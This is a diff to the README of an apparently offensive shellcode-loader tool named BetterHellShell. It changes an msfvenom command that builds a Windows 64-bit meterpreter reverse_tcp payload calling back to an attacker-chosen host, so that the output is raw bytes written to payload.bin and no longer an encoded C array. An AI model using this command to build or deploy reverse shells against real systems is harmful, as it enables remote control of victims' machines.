@@ -23,7 +23,7 @@ First you will need to generate your payload:
      ```
   - Generate payload to get a meterpreter reverse_tcp (64-bit):
      ```c
-     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<hostIP> LPORT=<hostPORT> -f c -e x64/zutto_dekiru
+     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<hostIP> LPORT=<hostPORT> -f raw -o payload.bin
      ```
 
 Then you can run BetterHellShell as follow:
